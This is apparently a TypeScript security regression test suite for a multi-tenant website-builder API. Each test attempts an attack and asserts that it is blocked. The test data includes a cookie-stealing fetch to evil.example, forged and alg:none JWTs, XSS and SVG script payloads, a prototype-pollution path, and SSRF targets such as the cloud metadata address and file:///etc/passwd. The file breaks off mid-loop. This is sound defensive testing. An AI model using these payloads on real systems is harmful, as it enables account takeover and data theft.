import { vi } from 'vitest';

// Security posture for this suite (must be set before the app — and its env() cache — loads).
vi.hoisted(() => {
  process.env.SUPER_ADMIN_REQUIRE_MFA = 'true';
  process.env.OUTBOUND_ALLOW_PRIVATE = 'false';
});

import { Test } from '@nestjs/testing';
import type { INestApplication } from '@nestjs/common';
import { DiscoveryService, MetadataScanner, Reflector } from '@nestjs/core';
import cookieParser from 'cookie-parser';
import { createHmac } from 'node:crypto';
import { authenticator } from 'otplib';
import request from 'supertest';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { AppModule } from '../src/app.module';
import { resetThrottles } from './reset-throttle';
import { ACCESS, IS_PUBLIC, SUPER_ADMIN } from '../src/common/decorators';
import { PrismaService } from '../src/common/prisma.service';
import { hashToken, randomToken } from '../src/common/tokens';
import { AuthService } from '../src/modules/auth/auth.service';

/**
 * Attack-oriented regression suite. Every test tries something an attacker would
 * (cross-tenant ids, privilege escalation, token tricks, hostile uploads) and
 * asserts it fails. Runs against real Postgres + Redis; skips when they are
 * unreachable unless REQUIRE_DB=1 (CI).
 */
let app: INestApplication;
let http: ReturnType<typeof request>;
let db: PrismaService['client'];
let auth: AuthService;
let ready = true;
const RUN = Date.now().toString(36);
const RENDERER_SECRET = process.env.RENDERER_SECRET ?? 'change-me-renderer-secret';
const PASSWORD = 'S3cure!Passw0rd#';

beforeAll(async () => {
  try {
    const mod = await Test.createTestingModule({ imports: [AppModule], providers: [DiscoveryService, MetadataScanner] }).compile();
    app = mod.createNestApplication();
    app.use(cookieParser());
    app.setGlobalPrefix('v1');
    await app.init();
    http = request(app.getHttpServer());
    db = app.get(PrismaService).client;
    auth = app.get(AuthService);
    await http.get('/v1/health/ready').expect(200);
    await resetThrottles(app);
  } catch (err) {
    if (process.env.REQUIRE_DB === '1') throw err;
    ready = false;
  }
}, 60_000);

afterAll(async () => {
  await app?.close();
});

const bearer = (token: string) => ({ Authorization: `Bearer ${token}` });

interface Actor {
  token: string;
  userId: string;
  email: string;
  sessionId: string;
}

/** Create a user directly through the service (no HTTP throttles), optionally with an organization. */
async function user(label: string, orgName?: string): Promise<Actor> {
  const email = `sec-${label}-${RUN}@example.test`;
  const r = await auth.register({ name: `Sec ${label}`, email, password: PASSWORD, organizationName: orgName }, { ip: '127.0.0.1' });
  const session = await db.session.findFirstOrThrow({ where: { userId: r.user.id }, orderBy: { createdAt: 'desc' } });
  return { token: r.accessToken, userId: r.user.id, email, sessionId: session.id };
}

async function orgOf(a: Actor) {
  const m = await db.organizationMember.findFirstOrThrow({ where: { userId: a.userId }, orderBy: { createdAt: 'asc' } });
  return m.organizationId;
}

async function roleId(orgId: string, key: string) {
  return (await db.role.findFirstOrThrow({ where: { organizationId: orgId, key } })).id;
}

/** Invite `member` into `orgId` with `role` as `inviter` and accept it. */
async function join(inviter: Actor, orgId: string, member: Actor, role: string) {
  const inv = await http.post(`/v1/organizations/${orgId}/invitations`).set(bearer(inviter.token)).send({ email: member.email, roleId: await roleId(orgId, role) }).expect(201);
  const token = String(inv.body.devAcceptUrl).split('/invite/')[1];
  await http.post('/v1/invitations/accept').set(bearer(member.token)).send({ token }).expect(200);
}

const world: {
  a: Actor; b: Actor; orgA: string; orgB: string; siteA: string; siteB: string; homeA: string; pageRevA: number; formA: string; subA: string;
  versionA: string; folderA: string; genA: string; integrationA: string; memberAOwner: string;
  viewer: Actor; editor: Actor; content: Actor; seo: Actor; designer: Actor; admin: Actor; recruiter: Actor;
} = {} as never;

async function draftOf(siteId: string, token: string) {
  return (await http.get(`/v1/websites/${siteId}/draft`).set(bearer(token)).expect(200)).body as { definition: { pages: Array<{ id: string; isHomepage: boolean; sections: Array<{ id: string; props: Record<string, unknown> }>; scripts?: unknown; status: string }> ; settings: Record<string, unknown> }; revisions: { pages: Record<string, number>; site: number } };
}

describe('security: setup', () => {
  it('creates two tenants with equivalent resources and members for every role', async () => {
    if (!ready) return;
    world.a = await user('owner-a', `Tenant A ${RUN}`);
    world.b = await user('owner-b', `Tenant B ${RUN}`);
    world.orgA = await orgOf(world.a);
    world.orgB = await orgOf(world.b);
    // test tenants get enough seats/sites for the role matrix (plan limits are tested elsewhere)
    await db.organization.updateMany({ where: { id: { in: [world.orgA, world.orgB] } }, data: { limits: { members: 50, websites: 20 } } });
    world.memberAOwner = (await db.organizationMember.findFirstOrThrow({ where: { organizationId: world.orgA, userId: world.a.userId } })).id;

    world.siteA = (await http.post(`/v1/organizations/${world.orgA}/websites`).set(bearer(world.a.token)).send({ name: `Site A ${RUN}`, source: { type: 'blank' } }).expect(201)).body.id;
    world.siteB = (await http.post(`/v1/organizations/${world.orgB}/websites`).set(bearer(world.b.token)).send({ name: `Site B ${RUN}`, source: { type: 'blank' } }).expect(201)).body.id;
    const draft = await draftOf(world.siteA, world.a.token);
    const home = draft.definition.pages.find((p) => p.isHomepage)!;
    world.homeA = home.id;
    world.pageRevA = draft.revisions.pages[home.id]!;
    world.formA = (await http.post(`/v1/websites/${world.siteA}/forms`).set(bearer(world.a.token)).send({ name: 'Contact', fields: [{ type: 'email', name: 'email', label: 'Email', required: true }, { type: 'file', name: 'cv', label: 'CV' }] }).expect(201)).body.id;
    await http.post(`/v1/public/forms/${world.formA}/submit`).send({ values: { email: 'lead@example.test', cv: [{ key: `private/submissions/${world.siteB}/stolen.pdf`, url: 'javascript:alert(1)', filename: 'x' }] } }).expect(200);
    world.subA = (await db.formSubmission.findFirstOrThrow({ where: { formId: world.formA } })).id;
    world.versionA = (await http.post(`/v1/websites/${world.siteA}/publish`).set(bearer(world.a.token)).send({}).expect(200)).body.version.id;
    world.folderA = (await http.post(`/v1/organizations/${world.orgA}/media-folders`).set(bearer(world.a.token)).send({ name: 'Private' }).expect(201)).body.id;
    world.genA = (await db.aiGeneration.create({ data: { organizationId: world.orgA, websiteId: world.siteA, userId: world.a.userId, kind: 'EDIT', prompt: 'tenant A secret prompt', provider: 'demo', model: 'atrium-demo', status: 'SUCCEEDED', operations: [{ op: 'updateSettings', patch: { scripts: [{ id: 'evil', name: 'x', placement: 'head', consentCategory: 'necessary', enabled: true, code: 'fetch("https://evil.example/?c="+document.cookie)' }] } }], result: { applied: false } } })).id;
    world.integrationA = (await db.integration.create({ data: { organizationId: world.orgA, name: 'A Vercel', driver: 'vercel', kind: 'DEPLOYMENT', config: {}, enabled: true } })).id;

    for (const [key, role] of [['viewer', 'viewer'], ['editor', 'editor'], ['content', 'content_manager'], ['seo', 'seo_manager'], ['designer', 'designer'], ['admin', 'admin']] as const) {
      world[key] = await user(key);
      await join(world.a, world.orgA, world[key], role);
    }
    // custom low-privilege role that may only invite
    const recruiterRole = await http.post(`/v1/organizations/${world.orgA}/roles`).set(bearer(world.a.token)).send({ name: `Recruiter ${RUN}`, permissions: ['organization.read', 'user.invite'] }).expect(201);
    world.recruiter = await user('recruiter');
    const inv = await http.post(`/v1/organizations/${world.orgA}/invitations`).set(bearer(world.a.token)).send({ email: world.recruiter.email, roleId: recruiterRole.body.id }).expect(201);
    await http.post('/v1/invitations/accept').set(bearer(world.recruiter.token)).send({ token: String(inv.body.devAcceptUrl).split('/invite/')[1] }).expect(200);
  }, 60_000);
});

describe('security: tenant isolation (tenant B attacks tenant A)', () => {
  const attacks: Array<[string, () => request.Test]> = [
    ['read website', () => http.get(`/v1/websites/${world.siteA}`)],
    ['read draft', () => http.get(`/v1/websites/${world.siteA}/draft`)],
    ['list pages', () => http.get(`/v1/websites/${world.siteA}/pages`)],
    ['read page', () => http.get(`/v1/pages/${world.homeA}`)],
    ['update page', () => http.patch(`/v1/pages/${world.homeA}`).send({ title: 'pwned', revision: world.pageRevA })],
    ['delete page', () => http.delete(`/v1/pages/${world.homeA}`)],
    ['apply operations', () => http.post(`/v1/websites/${world.siteA}/operations`).send({ operations: [{ op: 'updateSettings', patch: { name: 'pwned' } }] })],
    ['publish', () => http.post(`/v1/websites/${world.siteA}/publish`).send({})],
    ['export', () => http.get(`/v1/websites/${world.siteA}/export`)],
    ['clone', () => http.post(`/v1/websites/${world.siteA}/clone`).send({ name: 'stolen' })],
    ['delete website', () => http.delete(`/v1/websites/${world.siteA}`)],
    ['read form', () => http.get(`/v1/forms/${world.formA}`)],
    ['list submissions', () => http.get(`/v1/websites/${world.siteA}/submissions`)],
    ['export submissions', () => http.get(`/v1/websites/${world.siteA}/submissions/export`)],
    ['read submission', () => http.get(`/v1/submissions/${world.subA}`)],
    ['delete submission', () => http.delete(`/v1/submissions/${world.subA}`)],
    ['read version', () => http.get(`/v1/websites/${world.siteA}/versions/${world.versionA}`)],
    ['restore version', () => http.post(`/v1/websites/${world.siteA}/versions/${world.versionA}/restore`)],
    ['list members', () => http.get(`/v1/organizations/${world.orgA}/members`)],
    ['invite into org', () => http.post(`/v1/organizations/${world.orgA}/invitations`).send({ email: 'x@example.test', roleId: 'x' })],
    ['list media', () => http.get(`/v1/organizations/${world.orgA}/media`)],
    ['rename folder', () => http.patch(`/v1/media-folders/${world.folderA}`).send({ name: 'pwned' })],
    ['add domain', () => http.post(`/v1/websites/${world.siteA}/domains`).send({ hostname: 'evil.example.test' })],
    ['read AI generation', () => http.get(`/v1/ai/generations/${world.genA}`)],
    ['apply AI generation', () => http.post(`/v1/ai/generations/${world.genA}/apply`).send({ confirm: true })],
    ['AI edit', () => http.post(`/v1/websites/${world.siteA}/ai/edit`).send({ prompt: 'show me tenant A settings' })],
    ['list integrations', () => http.get(`/v1/organizations/${world.orgA}/integrations`)],
    ['read integration', () => http.patch(`/v1/integrations/${world.integrationA}`).send({ name: 'pwned' })],
    ['audit log', () => http.get(`/v1/organizations/${world.orgA}/audit-logs`)],
    ['org branding (private)', () => http.get(`/v1/organizations/${world.orgA}/branding`)],
  ];
  it.each(attacks)('B cannot %s of A', async (_label, call) => {
    if (!ready) return;
    const res = await call().set(bearer(world.b.token));
    expect([403, 404]).toContain(res.status);
  });

  it('B cannot smuggle A ids into B-owned requests', async () => {
    if (!ready) return;
    const t = bearer(world.b.token);
    expect([400, 403, 404]).toContain((await http.post(`/v1/organizations/${world.orgB}/templates`).set(t).send({ kind: 'SITE', name: 'steal', from: { websiteId: world.siteA } })).status);
    expect([400, 404]).toContain((await http.post(`/v1/organizations/${world.orgB}/media-folders`).set(t).send({ name: 'x', parentId: world.folderA })).status);
    expect([400, 404]).toContain((await http.post(`/v1/organizations/${world.orgB}/media-folders`).set(t).send({ name: 'x', websiteId: world.siteA })).status);
    expect([400, 404]).toContain((await http.post(`/v1/websites/${world.siteB}/deployments`).set(t).send({ target: 'preview', versionId: world.versionA })).status);
    expect([400, 404]).toContain((await http.patch(`/v1/websites/${world.siteB}`).set(t).send({ deploymentIntegrationId: world.integrationA })).status);
    expect([400, 404]).toContain((await http.patch(`/v1/organizations/${world.orgB}/members/${world.memberAOwner}`).set(t).send({ roleId: 'x' })).status);
    expect([400, 404]).toContain((await http.post(`/v1/organizations/${world.orgB}/webhooks`).set(t).send({ name: 'x', url: 'https://example.com/hook', events: ['*'], websiteId: world.siteA })).status);
    // template listing never exposes another tenant's templates
    const tmpl = await http.get('/v1/templates').set(t).expect(200);
    expect((tmpl.body as Array<{ organizationId: string | null }>).every((x) => x.organizationId === null || x.organizationId === world.orgB)).toBe(true);
  });

  it('stores only server-generated file references for submissions', async () => {
    if (!ready) return;
    const detail = await http.get(`/v1/submissions/${world.subA}`).set(bearer(world.a.token)).expect(200);
    expect(JSON.stringify(detail.body)).not.toMatch(/javascript:|stolen\.pdf/);
  });
});

describe('security: role permission matrix (inside tenant A)', () => {
  const ops = (token: string, operations: unknown[]) => http.post(`/v1/websites/${world.siteA}/operations`).set(bearer(token)).send({ operations });
  const script = { op: 'updateSettings', patch: { scripts: [{ id: 'x', name: 'x', placement: 'head', consentCategory: 'necessary', enabled: true, code: 'alert(1)' }] } };

  it('viewer can read but not edit, publish, create or share drafts', async () => {
    if (!ready) return;
    const t = bearer(world.viewer.token);
    await http.get(`/v1/websites/${world.siteA}/draft`).set(t).expect(200);
    await http.patch(`/v1/pages/${world.homeA}`).set(t).send({ title: 'x', revision: world.pageRevA }).expect(403);
    await http.post(`/v1/websites/${world.siteA}/publish`).set(t).send({}).expect(403);
    await http.post(`/v1/organizations/${world.orgA}/websites`).set(t).send({ name: 'x' }).expect(403);
    await http.post(`/v1/websites/${world.siteA}/preview-tokens`).set(t).send({}).expect(403);
    await http.get(`/v1/websites/${world.siteA}/submissions`).set(t).expect(403);
  });

  it('editor can edit content but cannot inject code, theme, redirects, forms or delete pages via the generic operations endpoint', async () => {
    if (!ready) return;
    const t = world.editor.token;
    const draft = await draftOf(world.siteA, t);
    const home = draft.definition.pages.find((p) => p.isHomepage)!;
    await ops(t, [{ op: 'setProp', pageId: home.id, nodeId: home.sections[0]!.id, path: 'heading', value: 'Editor was here' }]).expect(201);
    for (const op of [
      script,
      { op: 'setCustomCss', css: 'body{display:none}' },
      { op: 'updateTheme', patch: { colors: { primary: '#ff0000' } } },
      { op: 'setRedirects', redirects: [{ source: '/', destination: 'https://evil.example', statusCode: 301, enabled: true }] },
      { op: 'createForm', form: { name: 'Exfil', slug: `exfil-${RUN}`, fields: [] } },
      { op: 'deletePage', pageId: (await http.post(`/v1/websites/${world.siteA}/pages`).set(bearer(world.a.token)).send({ title: `Deletable ${RUN}` }).expect(201)).body.id },
      { op: 'updateNode', pageId: home.id, nodeId: home.sections[0]!.id, customCss: '&{position:fixed;inset:0}' },
    ]) {
      const res = await ops(t, [op]);
      expect(res.status, JSON.stringify(op)).toBe(403);
    }
    const after = await draftOf(world.siteA, world.a.token);
    expect(JSON.stringify(after.definition.settings)).not.toContain('alert(1)');
  });

  it('editor cannot add page scripts through page autosave', async () => {
    if (!ready) return;
    const draft = await draftOf(world.siteA, world.editor.token);
    const home = draft.definition.pages.find((p) => p.isHomepage)!;
    await http.patch(`/v1/pages/${home.id}`).set(bearer(world.editor.token)).send({ document: { ...home, scripts: { head: '<script>alert(1)</script>' } }, revision: draft.revisions.pages[home.id] }).expect(403);
  });

  it('content manager cannot schedule a publish (needs page.publish)', async () => {
    if (!ready) return;
    const draft = await draftOf(world.siteA, world.content.token);
    const home = draft.definition.pages.find((p) => p.isHomepage)!;
    await http.patch(`/v1/pages/${home.id}`).set(bearer(world.content.token)).send({ status: 'scheduled', publishAt: new Date(Date.now() + 60_000).toISOString(), revision: draft.revisions.pages[home.id] }).expect(403);
  });

  it('SEO manager may change SEO settings only', async () => {
    if (!ready) return;
    const t = bearer(world.seo.token);
    const draft = await draftOf(world.siteA, world.seo.token);
    const settings = draft.definition.settings as { seo: Record<string, unknown>; name: string };
    await http.put(`/v1/websites/${world.siteA}/draft/site`).set(t).send({ settings: { ...settings, seo: { ...settings.seo, siteTitle: `SEO ${RUN}` } }, revision: draft.revisions.site }).expect(200);
    const fresh = await draftOf(world.siteA, world.seo.token);
    await http.put(`/v1/websites/${world.siteA}/draft/site`).set(t).send({ settings: { ...fresh.definition.settings, name: 'Renamed by SEO' }, revision: fresh.revisions.site }).expect(403);
  });

  it('applying an AI proposal is authorized like a manual edit by the applying user', async () => {
    if (!ready) return;
    const res = await http.post(`/v1/ai/generations/${world.genA}/apply`).set(bearer(world.editor.token)).send({ confirm: true });
    expect([403, 409]).toContain(res.status);
    const draft = await draftOf(world.siteA, world.a.token);
    expect(JSON.stringify(draft.definition.settings)).not.toContain('evil.example');
  });

  it('admin cannot escalate to owner, edit themselves, or out-rank the owner', async () => {
    if (!ready) return;
    const t = bearer(world.admin.token);
    const ownerRole = await roleId(world.orgA, 'owner');
    const adminMember = (await db.organizationMember.findFirstOrThrow({ where: { organizationId: world.orgA, userId: world.admin.userId } })).id;
    const editorMember = (await db.organizationMember.findFirstOrThrow({ where: { organizationId: world.orgA, userId: world.editor.userId } })).id;
    await http.patch(`/v1/organizations/${world.orgA}/members/${adminMember}`).set(t).send({ roleId: ownerRole }).expect(403);
    await http.patch(`/v1/organizations/${world.orgA}/members/${editorMember}`).set(t).send({ roleId: ownerRole }).expect(403);
    await http.post(`/v1/organizations/${world.orgA}/invitations`).set(t).send({ email: `x-${RUN}@example.test`, roleId: ownerRole }).expect(403);
    await http.post(`/v1/organizations/${world.orgA}/roles`).set(t).send({ name: 'Mega', permissions: ['organization.delete', 'billing.manage'] }).expect(403);
    await http.delete(`/v1/organizations/${world.orgA}/members/${world.memberAOwner}`).set(t).expect(403);
    await http.patch(`/v1/organizations/${world.orgA}/roles/${await roleId(world.orgA, 'admin')}`).set(t).send({ permissions: ['organization.delete'] }).expect(403);
    // but legitimate delegation still works
    await http.patch(`/v1/organizations/${world.orgA}/members/${editorMember}`).set(t).send({ roleId: await roleId(world.orgA, 'viewer') }).expect(200);
    await http.patch(`/v1/organizations/${world.orgA}/members/${editorMember}`).set(bearer(world.a.token)).send({ roleId: await roleId(world.orgA, 'editor') }).expect(200);
  });

  it('a user with only user.invite cannot invite anyone more privileged than themselves', async () => {
    if (!ready) return;
    const t = bearer(world.recruiter.token);
    for (const key of ['owner', 'admin', 'viewer']) {
      await http.post(`/v1/organizations/${world.orgA}/invitations`).set(t).send({ email: `inv-${key}-${RUN}@example.test`, roleId: await roleId(world.orgA, key) }).expect(403);
    }
  });

  it('the last owner cannot leave or be demoted', async () => {
    if (!ready) return;
    await http.delete(`/v1/organizations/${world.orgA}/members/${world.memberAOwner}`).set(bearer(world.a.token)).expect(400);
    await http.patch(`/v1/organizations/${world.orgA}/members/${world.memberAOwner}`).set(bearer(world.a.token)).send({ roleId: await roleId(world.orgA, 'viewer') }).expect(403);
  });

  it('builder input cannot pollute prototypes or break out of CSS', async () => {
    if (!ready) return;
    const draft = await draftOf(world.siteA, world.a.token);
    const home = draft.definition.pages.find((p) => p.isHomepage)!;
    const nodeId = home.sections[0]!.id;
    const pollute = await ops(world.a.token, [{ op: 'setProp', pageId: home.id, nodeId, path: '__proto__.polluted', value: 'yes' }]);
    expect(pollute.status).toBeGreaterThanOrEqual(400);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    const css = await ops(world.a.token, [{ op: 'setStyle', pageId: home.id, nodeId, key: 'padding', value: '1px}</style><script>alert(1)</script><style>' }]);
    if (css.status < 400) {
      const snap = await http.get(`/v1/websites/${world.siteA}/draft`).set(bearer(world.a.token)).expect(200);
      expect(JSON.stringify(snap.body)).not.toContain('</style><script>');
    }
  });
});

describe('security: authentication', () => {
  it('rejects tampered, unsigned and wrongly-scoped tokens, and tokens in URLs', async () => {
    if (!ready) return;
    const [h, p] = world.a.token.split('.');
    const body = JSON.parse(Buffer.from(p!, 'base64url').toString());
    const forged = `${h}.${Buffer.from(JSON.stringify({ ...body, sub: world.b.userId })).toString('base64url')}.${world.a.token.split('.')[2]}`;
    await http.get('/v1/auth/me').set(bearer(forged)).expect(401);
    const none = `${Buffer.from('{"alg":"none","typ":"JWT"}').toString('base64url')}.${p}.`;
    await http.get('/v1/auth/me').set(bearer(none)).expect(401);
    const secret = process.env.JWT_ACCESS_SECRET!;
    const noAud = `${h}.${Buffer.from(JSON.stringify({ sub: body.sub, sid: body.sid, iat: body.iat, exp: body.exp })).toString('base64url')}`;
    const noAudToken = `${noAud}.${createHmac('sha256', secret).update(noAud).digest('base64url')}`;
    await http.get('/v1/auth/me').set(bearer(noAudToken)).expect(401);
    await http.get(`/v1/auth/me?access_token=${world.a.token}`).expect(401);
    await http.get('/v1/auth/me').set(bearer(world.a.token)).expect(200);
  });

  it('blocks login CSRF (form posts and foreign origins)', async () => {
    if (!ready) return;
    await http.post('/v1/auth/login').type('form').send({ email: world.a.email, password: PASSWORD }).expect(403);
    await http.post('/v1/auth/login').set('Origin', 'https://evil.example').send({ email: world.a.email, password: PASSWORD }).expect(403);
  });

  it('locks an account after repeated failures regardless of source IP', async () => {
    if (!ready) return;
    const victim = await user('lockout');
    for (let i = 0; i < 8; i++) {
      const r = await http.post('/v1/auth/login').set('X-Forwarded-For', `198.51.100.${i}`).send({ email: victim.email, password: `wrong-${i}` });
      expect([401, 429]).toContain(r.status);
    }
    await http.post('/v1/auth/login').send({ email: victim.email, password: PASSWORD }).expect(429);
  });

  it('detects refresh-token reuse and revokes the session', async () => {
    if (!ready) return;
    const u = await user('refresh');
    const issued = await auth.issue(u.userId, {}, false);
    const r1 = await http.post('/v1/auth/refresh').set('Cookie', `atrium_rt=${issued.refreshToken}`).expect(200);
    const rt2 = String(r1.headers['set-cookie']).match(/atrium_rt=([^;]+)/)![1]!;
    // within the multi-tab grace window: rejected but not treated as theft
    await http.post('/v1/auth/refresh').set('Cookie', `atrium_rt=${issued.refreshToken}`).expect(401);
    const session = await db.session.findFirstOrThrow({ where: { refreshTokenHash: hashToken(rt2) } });
    await db.session.update({ where: { id: session.id }, data: { rotatedAt: new Date(Date.now() - 5 * 60_000) } });
    await http.post('/v1/auth/refresh').set('Cookie', `atrium_rt=${issued.refreshToken}`).expect(401);
    expect((await db.session.findUniqueOrThrow({ where: { id: session.id } })).revokedAt).not.toBeNull();
    await http.post('/v1/auth/refresh').set('Cookie', `atrium_rt=${rt2}`).expect(401);
  });

  it('password reset links are single use and older links die with the newest', async () => {
    if (!ready) return;
    const u = await user('reset');
    const older = randomToken();
    const newer = randomToken();
    await db.userToken.create({ data: { userId: u.userId, type: 'PASSWORD_RESET', tokenHash: hashToken(older), expiresAt: new Date(Date.now() + 3_600_000) } });
    await db.userToken.create({ data: { userId: u.userId, type: 'PASSWORD_RESET', tokenHash: hashToken(newer), expiresAt: new Date(Date.now() + 3_600_000) } });
    const expired = randomToken();
    await db.userToken.create({ data: { userId: u.userId, type: 'PASSWORD_RESET', tokenHash: hashToken(expired), expiresAt: new Date(Date.now() - 1000) } });
    await http.post('/v1/auth/password/reset').send({ token: expired, password: 'N3w!Password#99' }).expect(400);
    await http.post('/v1/auth/password/reset').send({ token: newer, password: 'N3w!Password#99' }).expect(204);
    await http.post('/v1/auth/password/reset').send({ token: newer, password: 'An0ther!Pass#1' }).expect(400);
    await http.post('/v1/auth/password/reset').send({ token: older, password: 'An0ther!Pass#1' }).expect(400);
    await http.get('/v1/auth/me').set(bearer(u.token)).expect(401); // sessions revoked
  });

  it('forgot-password never reveals whether an account exists', async () => {
    if (!ready) return;
    const known = await http.post('/v1/auth/password/forgot').send({ email: world.a.email });
    const unknown = await http.post('/v1/auth/password/forgot').send({ email: `nobody-${RUN}@example.test` });
    expect(known.status).toBe(204);
    expect(unknown.status).toBe(204);
  });

  it('MFA: challenges burn after failed guesses and codes cannot be replayed', async () => {
    if (!ready) return;
    const u = await user('mfa');
    const setup = await http.post('/v1/auth/mfa/setup').set(bearer(u.token)).send({}).expect(201);
    const code = authenticator.generate(setup.body.secret);
    await http.post('/v1/auth/mfa/enable').set(bearer(u.token)).send({ code }).expect(200);
    const login = await auth.login({ email: u.email, password: PASSWORD }, {});
    expect('mfaRequired' in login).toBe(true);
    const challenge = (login as { challengeToken: string }).challengeToken;
    await http.post('/v1/auth/mfa/verify').send({ challengeToken: challenge, code }).expect(401); // replay of the enable code
    for (let i = 0; i < 5; i++) await http.post('/v1/auth/mfa/verify').send({ challengeToken: challenge, code: '000000' });
    await http.post('/v1/auth/mfa/verify').send({ challengeToken: challenge, code: authenticator.generate(setup.body.secret) }).expect(401); // burned
  });

  it('sensitive account changes need recent authentication', async () => {
    if (!ready) return;
    const u = await user('stepup');
    await db.session.update({ where: { id: u.sessionId }, data: { createdAt: new Date(Date.now() - 60 * 60_000) } });
    const stale = await http.post('/v1/auth/mfa/setup').set(bearer(u.token)).send({}).expect(403);
    expect(stale.body.error.details.reason).toBe('REAUTH_REQUIRED');
    await http.post('/v1/auth/mfa/setup').set(bearer(u.token)).send({ currentPassword: 'wrong' }).expect(422);
    await http.post('/v1/auth/mfa/setup').set(bearer(u.token)).send({ currentPassword: PASSWORD }).expect(201);
  });

  it('super-admin access requires a second factor and tenant access is audited', async () => {
    if (!ready) return;
    const sa = await user('superadmin');
    await db.user.update({ where: { id: sa.userId }, data: { isSuperAdmin: true } });
    await http.get('/v1/admin/overview').set(bearer(sa.token)).expect(403);
    await http.get(`/v1/websites/${world.siteA}`).set(bearer(sa.token)).expect(403);
    await db.user.update({ where: { id: sa.userId }, data: { mfaEnabled: true } });
    await db.session.update({ where: { id: sa.sessionId }, data: { mfaVerified: true } });
    await http.get('/v1/admin/overview').set(bearer(sa.token)).expect(200);
    await http.get(`/v1/websites/${world.siteA}`).set(bearer(sa.token)).expect(200);
    const log = await db.auditLog.findFirst({ where: { organizationId: world.orgA, actorId: sa.userId, action: 'platform.tenant_read' } });
    expect(log).not.toBeNull();
  });

  it('open redirect protection in the admin login helper', async () => {
    const { safeNext } = await import('../../admin/src/lib/auth-paths');
    for (const bad of ['//evil.example', '/\\evil.example', '/\t/evil.example', '/%09/evil.example'.replace('%09', '\t'), 'https://evil.example', 'javascript:alert(1)', '/\n/evil.example']) {
      expect(safeNext(bad)).toBe('/');
    }
    expect(safeNext('/org/1/websites?tab=a#x')).toBe('/org/1/websites?tab=a#x');
  });
});

describe('security: hostile content and integrations', () => {
  it('uploads are typed by content: HTML disguised as an image is stored as inert text', async () => {
    if (!ready) return;
    const res = await http.post(`/v1/organizations/${world.orgA}/media/upload`).set(bearer(world.a.token)).field('allowDuplicate', 'true').attach('file', Buffer.from('<html><script>alert(document.domain)</script></html>'), { filename: 'avatar.png', contentType: 'image/png' });
    expect(res.status).toBe(201);
    expect(res.body.mimeType).toBe('text/plain');
    expect(res.body.url).not.toMatch(/\.(png|html?)$/);
    const exe = await http.post(`/v1/organizations/${world.orgA}/media/upload`).set(bearer(world.a.token)).attach('file', Buffer.from([0x4d, 0x5a, 0x90, 0, 3, 0, 0, 0, 4, 0, 0, 0, 0xff, 0xff, 0, 0, 0xb8, 0, 0, 0]), { filename: 'photo.jpg', contentType: 'image/jpeg' });
    expect(exe.status).toBe(422);
  });

  it('SVG uploads are sanitized before storage', async () => {
    if (!ready) return;
    const svg = '<svg xmlns="http://www.w3.org/2000/svg"><script >alert(1)</script ><a href="&#106;avascript:alert(1)"><rect width="10" height="10"/></a></svg>';
    const res = await http.post(`/v1/organizations/${world.orgA}/media/upload`).set(bearer(world.a.token)).field('allowDuplicate', 'true').attach('file', Buffer.from(svg), { filename: 'logo.svg', contentType: 'image/svg+xml' });
    expect(res.status).toBe(201);
    const url = String(res.body.url);
    const stored = url.includes('/v1/storage/') ? (await http.get(url.slice(url.indexOf('/v1/storage/'))).buffer(true)).body.toString() : await (await fetch(url)).text().catch(() => '');
    if (stored) expect(stored).not.toMatch(/<script|javascript:|&#106;/i);
  });

  it('unverified custom domains are neither served nor eligible for TLS', async () => {
    if (!ready) return;
    const host = `shop-${RUN}.example.test`;
    await http.post(`/v1/websites/${world.siteA}/domains`).set(bearer(world.a.token)).send({ hostname: host }).expect(201);
    await http.get(`/v1/public/sites/resolve?host=${host}`).set('X-Renderer-Secret', RENDERER_SECRET).expect(404);
    await http.get(`/v1/public/domains/check?domain=${host}`).expect(404);
    // another tenant cannot take it without DNS proof, and learns how to prove ownership
    const squat = await http.post(`/v1/websites/${world.siteB}/domains`).set(bearer(world.b.token)).send({ hostname: host }).expect(409);
    expect(JSON.stringify(squat.body)).toContain('atrium-claim=');
  });

  it('webhooks cannot target internal addresses', async () => {
    if (!ready) return;
    for (const url of ['http://169.254.169.254/latest/meta-data', 'http://127.0.0.1:4000/v1/health', 'http://[::ffff:127.0.0.1]/', 'file:///etc/passwd']) {
      const r = await http.post(`/v1/organizations/${world.orgA}/webhooks`).set(bearer(world.a.token)).send({ name: 'x', url, events: ['*'] });
      expect(r.status, url).toBeGreaterThanOrEqual(400);
    }
  });

  it('public form endpoint rejects malformed multipart without a 500', async () => {
    if (!ready) return;
    const r = await http.post(`/v1/public/forms/${world.formA}/submit`).field('values', '{not json');
    expect(r.status).toBe(400);
  });

  it('renderer-only endpoints require the renderer secret', async () => {
    if (!ready) return;
    await http.get('/v1/public/sites/resolve?host=anything').expect(403);
    await http.get('/v1/public/preview?token=x').expect(403);
  });
});

describe('security: route inventory', () => {
  /**
   * Default-deny check: every authenticated route either declares @Access (resource + permission,
   * resolved server-side), is super-admin only, or is on this short reviewed list of
   * "any signed-in user" routes that only touch the caller's own data or public catalog data.
   */
  const SELF_OR_CATALOG = new Set([
    'GET /auth/me', 'PATCH /auth/me', 'POST /auth/logout', 'POST /auth/password/change', 'GET /auth/sessions', 'DELETE /auth/sessions/:id', 'POST /auth/sessions/revoke-others',
    'POST /auth/mfa/setup', 'POST /auth/mfa/enable', 'POST /auth/mfa/disable', 'POST /auth/email/resend',
    'GET /organizations', 'POST /organizations', 'GET /permissions', 'POST /invitations/accept',
    'GET /templates', 'GET /templates/:id', 'GET /ai/models', 'GET /providers/drivers',
    'GET /registry/components', 'GET /registry/components/:type/schema', 'GET /registry/animations', 'GET /registry/themes',
  ]);
  it('has no unguarded tenant routes', async () => {
    if (!ready) return;
    const discovery = app.get(DiscoveryService);
    const scanner = app.get(MetadataScanner);
    const reflector = app.get(Reflector);
    const offenders: string[] = [];
    for (const wrapper of discovery.getControllers()) {
      const instance = wrapper.instance as object | undefined;
      if (!instance || !wrapper.metatype) continue;
      const base = String(Reflect.getMetadata('path', wrapper.metatype) ?? '').replace(/^\/|\/$/g, '');
      for (const name of scanner.getAllMethodNames(Object.getPrototypeOf(instance))) {
        const handler = (instance as Record<string, unknown>)[name] as object;
        const path = Reflect.getMetadata('path', handler) as string | string[] | undefined;
        const method = Reflect.getMetadata('method', handler) as number | undefined;
        if (path === undefined || method === undefined) continue;
        const verb = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'ALL', 'OPTIONS', 'HEAD'][method]!;
        for (const p of [path].flat()) {
